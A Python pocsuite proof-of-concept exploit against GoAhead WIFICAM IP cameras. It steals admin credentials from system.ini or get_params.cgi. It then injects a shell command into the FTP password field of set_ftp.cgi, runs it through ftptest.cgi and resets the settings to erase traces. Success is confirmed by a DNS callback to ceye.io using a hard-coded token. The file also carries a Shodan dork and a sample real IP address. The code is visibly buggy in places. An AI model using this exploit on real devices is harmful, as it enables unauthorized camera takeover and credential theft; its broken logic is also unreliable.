#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
import random
import hashlib
import socket
import re
import sys



class TestPOC(POCBase):
    name = "GoAhead WIFICAM Command Execution  "
    vulID = ''
    author = ['sebao']
    vulType = 'Command Execution'
    version = '1.0'    # default version: 1.0
    references = ['']
    desc = '''GoAhead系列网络摄像头 命令执行'''
    dork='GoAhead 5ccc069c403ebaf9f0171e9517f40e41 port:81'

    vulDate = ''
    createDate = '2017-6-29'
    updateDate = '2017-6-29'

    appName = 'goahead'
    appVersion = ''
    appPowerLink = ''
    samples = ['http://109.133.107.27:81'
               ]

    system_ini = ""
    get_params = ""
    flag = ["0", "0", "0"]
    '''
    flag[0] = 0,1 <==> get_system_ini()  200=>1 401 =>2 404=>3 other=>4
    flag[1] = 0,1 <==> get_params_cgi_1()
    flag[2] = 0,1 <==> get_params_cgi_2()
    '''

    def get_params_cgi_1(host, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        payload = "GET http://localhost:get_params.cgi#123 HTTP/1.1\n\n"
        data = {}
        s.send(payload)
        for i in range(10):
            self.get_params += s.recv(1024)
        self.flag[1] = 1
        s.close()

    def get_params_cgi_2(host):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host))
        payload = "GET get_params.cgi HTTP/1.1\n\n"
        data = {}
        s.send(payload)
        for i in range(100):
            self.get_params += s.recv(1024)
        self.flag[1] = 1
        s.close()

    def get_system_ini(self,geturl):

        url = '/system.ini?loginuse&loginpas'
        vulurl = geturl + url
        
        try:
            data = req.get(vulurl, verify=False)
            if data.status_code == 200:
                for i in data.content:
                    self.system_ini += chr(ord(i))
                self.flag[0] = 1
            elif data.status_code == 401:
                print "[-]get_system_ini() return 401 fail"
                flag[0] = 2
            elif data.status_code == 404:
                print "[-]get_system_ini() return 404 fail"
                flag[0] = 3
            else:
                flag[0] = 4
        except:
            flag[0] = 4
            print "[-]get_system_ini() fail"

    def get_username_password(self):
        get_params = ""
        flag = ["0", "0", "0"]
        system_ini = ""
        flag2 = 0
        result = {}
        temp = []
        temp = get_params.split("\x0d\x0a")
        if "200" in temp[0]:
            for i in range(len(temp) - 1):
                if 'user' in temp[i]:
                    if 'pwd' in temp[i + 1]:
                        if temp[i].split("=")[1].split(";")[0] != "\"\"" and temp[i + 1].split("=")[1].split(";")[
                            0] != "\"\"":
                            result['username'] = temp[i].split("=")[1].split(";")[0].split("\"")[1]
                            result['password'] = temp[i].split("=")[1].split(";")[0].split("\"")[1]
                            flag2 = 1
                            break
        else:
            print "[-]get username&password in get_params.cgi fail"
        if flag2 == 0:
            print "[+]get_params.cgi:\n" + get_params
            print "[-]but we cant get password"
            return False
        else:
            return result

    def getshell(self, host,username, password,rand):

        url_setftp1 = host + "/set_ftp.cgi?next_url=ftp.htm&loginuse=" + username + "&loginpas=" + password + "&svr=192.168.1.1&port=21&user=ftp&pwd=$(ping+"+rand+".4vtkdk.ceye.io)f&dir=/&mode=PORT&upload_interval=0"
        url_ftptest = host + "/ftptest.cgi?next_url=test_ftp.htm&loginuse=" + username + "&loginpas=" + password
        url_setftp2 = host+ "/set_ftp.cgi?next_url=ftp.htm&loginuse="+username+"&loginpas="+password+"&svr=192.168.1.1&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0"
        data1 = req.get(url_setftp1, timeout=10)
        print "[+]set ftp"
        data2 = req.get(url_ftptest, timeout=10)
        print "[+]ftp test connection"
        data3 = req.get(url_setftp2, timeout=10)
        print "[+]set ftp"
        # data3 为 将之前修改的ftp各值改成默认的值，去除命令执行的痕迹



    def _attack(self):
        return self._verify(self)



    def _verify(self):
        '''verify mode'''
        result = {}
        print "[+]get_system_ini()"
        self.get_system_ini(self.url)
        username = ""
        password = ""
        rand = str(random.randint(100000, 900000))
        print rand
        if flag[0] == 1 and system_ini != "":
            print "[+]get username&password in system.ini"
            try:
                temp1 = system_ini.split("\x0a\x0a\x0a\x0a\x01")
                temp2 = system_ini.split("\x01\x01\x01\x01\x01")
                temp3 = system_ini.split("\x05\x05\x05\x05\x01")
                if len(temp1) == 2:
                    username = temp1[1][137:137 + 32].split("\x00")[0]
                    password = temp1[1][137 + 32:137 + 64].split("\x00")[0]
                    print "[+]get username = " + username
                    print "[+]get password = " + password
                elif len(temp2) == 2:
                    username = temp2[1][142:137 + 32].split("\x00")[0]
                    password = temp2[1][142 + 32:142 + 64].split("\x00")[0]
                    print "[+]get username = " + username
                    print "[+]get password = " + password
                elif len(temp3) == 2:
                    username = temp3[1][141:141 + 32]
                    password = temp3[1][141 + 32:141 + 64]
                    print "[+]get username = " + username
                    print "[+]get password = " + password
                else:
                    print "[+]system.ini:\n" + system_ini
                    print "[-]but we cant get password"
            except:
                print "[-]system.ini split error"
        if username == "":
            print "[-]get username&password in system.ini fail"
            print "[+]get username&password in get_params.cgi"
            get_params_cgi_2(self.url)
            result = get_username_password()
            if result != False:
                username = result['username']
                password = result['password']
                print "[+]get username =" + result['username']
                print "[+]get password =" + result['password']
            else:
                print "[-]get username&password in get_params.cgi fail"
        if username != "" and password != "":
            self.getshell(self.url, username, password,rand)
            print "[+]command execute"



        if self.url.endswith('/'):
            self.url = self.url[:-1]

        token="e6f6c85bef5c83c7ed794b3904688c01"
        url1="http://ceye.io/api/record?token=%s&type=dns" % token
        resp1 = req.get(url1)
        print resp1.content
        if resp1.status_code == 200 and 'a' in resp1.content:
            result['ShellInfo'] = {}
            result['ShellInfo']['URL'] = url

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
